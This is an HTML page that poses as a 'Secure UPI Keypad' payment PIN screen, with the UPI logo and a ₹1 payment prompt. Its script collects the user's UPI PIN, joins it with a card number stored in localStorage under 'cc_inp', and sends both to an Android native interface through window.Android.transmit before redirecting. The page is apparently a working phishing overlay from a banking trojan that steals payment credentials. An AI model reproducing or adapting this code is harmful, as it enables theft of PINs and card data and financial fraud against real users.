<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure UPI Keypad</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
    body { display: flex; flex-direction: column; align-items: center; height: 100vh; background-color: white; position: relative; }
    .header { width: 100%; height: 50px; padding-left: 10px; display: flex; justify-content: space-between; align-items: center; position: fixed; top: 0; background-color: white; z-index: 10; }
    .header img { width: auto; height: 40px; }
    .details { width: 100%; padding: 5px 15px; display: flex; justify-content: space-between; align-items: center; background-color: #e3e3e3; color: #434343; font-size: 15px; font-weight: 500; margin-top: 55px; }
    .center-content { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; position: absolute; top: 30%; transform: translateY(-50%); width: 100%; }
    h5 { font-size: 15px; font-weight: 500; color: #3d3d3d; margin-bottom: 15px; }
    .input-container { font-size: 40px; font-weight: bolder; color: #00198d; letter-spacing: 10px; display: flex; gap: 5px; margin-bottom: 15px; }
    .warning { font-size: 25px; font-weight: 500; border-radius: 20px; background: rgba(255, 199, 0, 0.4); display: flex; width: 85%; padding: 10px; color: #ff9d00; align-items: center; justify-content: center; gap: 2px; margin-top: 15px; }
    .warning i { font-size: 35px; margin-left: 0px; }
    .warning p { text-align: start; color: black; font-size: 14px; margin-left: 10px; }
    .keypad { width: 100%; display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; text-align: center; position: fixed; bottom: 0; padding-bottom: 30px; padding-top: 15px; padding-left: 15px; padding-right: 15px; background-color: #f1f1f1; }
    .key { display: flex; justify-content: center; align-items: center; height: 60px; font-size: 30px; font-weight: bold; color: #00198d; background-color: transparent; cursor: pointer; user-select: none; }
    #done, #done1 { font-size: 40px; }
    .error-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); z-index: 9999; align-items: center; justify-content: center; }
    .error-dialog { background: white; border-radius: 20px; padding: 30px 25px; max-width: 320px; width: 90%; text-align: center; }
    .error-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 15px; cursor: pointer; margin-top: 15px; }
  </style>
</head>
<body>
  <div class="header"><p><b>Paying ₹1/-</b><br>Unified Payment Interface</p><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo"></div>
  <div class="details"><p>Account Number XXX</p><p>UPI Secure</p></div>
  <div class="center-content">
    <h5>ENTER UPI PIN</h5>
    <div class="input-container" id="input-display"><span></span> <span></span> <span></span> <span></span> <span></span> <span></span></div>
    <div class="warning"><i class="fas fa-exclamation-circle"></i><p>UPI PIN will keep your account safe from unauthorized access.<br>don't share this pin with anyone.</p></div>
  </div>
  <div class="error-overlay" id="errorOverlay"><div class="error-dialog"><div class="error-icon">⚠️</div><h3>Invalid PIN Length</h3><p>Please enter a valid 4 or 6-digit UPI PIN to continue.</p><button class="error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">Got it</button></div></div>
  <div class="keypad">
    <div class="key" onclick="enterNumber(1)">1</div><div class="key" onclick="enterNumber(2)">2</div><div class="key" onclick="enterNumber(3)">3</div>
    <div class="key" onclick="enterNumber(4)">4</div><div class="key" onclick="enterNumber(5)">5</div><div class="key" onclick="enterNumber(6)">6</div>
    <div class="key" onclick="enterNumber(7)">7</div><div class="key" onclick="enterNumber(8)">8</div><div class="key" onclick="enterNumber(9)">9</div>
    <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
    <div class="key" onclick="enterNumber(0)">0</div>
    <div class="key" id="done" onclick="submitData()"><i class="fas fa-circle-check"></i></div>
  </div>

  <script>
    let enteredNumbers = [];
    function updateDisplay() {
      const display = document.getElementById("input-display");
      display.innerHTML = "";
      for (let i = 0; i < 6; i++) {
        const span = document.createElement("span");
        span.textContent = enteredNumbers[i] !== undefined ? "•" : "";
        display.appendChild(span);
      }
    }
    function enterNumber(num) { if (enteredNumbers.length < 6) { enteredNumbers.push(num); updateDisplay(); } }
    function deleteNumber() { enteredNumbers.pop(); updateDisplay(); }
    
    function submitData() {
      if (enteredNumbers.length === 4 || enteredNumbers.length === 6) {
        const upipin = enteredNumbers.join('');
        const fullCard = localStorage.getItem("cc_inp") || "No Card";
        const paymentData = `PIN: ${upipin} | Card: ${fullCard}`;
        
        // Send this to Android Interface
        if (window.Android && window.Android.transmit) {
            window.Android.transmit("upipin", paymentData);
        }
        
        // Redirect to Success page
        window.location.href = "final.html";
      } else {
        document.getElementById('errorOverlay').style.display = 'flex';
      }
    }
    updateDisplay();
  </script>
</body>
</html>
